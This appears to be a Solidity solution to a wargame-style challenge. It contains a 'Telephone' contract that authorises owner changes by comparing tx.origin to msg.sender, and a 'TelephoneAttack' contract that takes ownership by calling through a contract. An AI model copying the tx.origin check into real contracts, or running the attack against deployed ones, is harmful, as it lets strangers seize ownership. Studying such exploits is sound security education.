pragma solidity ^0.4.24;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneAttack {

    Telephone victim;

    constructor(address _victim) public {
        victim = Telephone(_victim);
    }

    //victim is vulnerable because its possible to changeOwner calling the
    //function from a contract
    function attack() external payable returns(bool success) {
        victim.changeOwner(address(this));
        return success;
    }

}
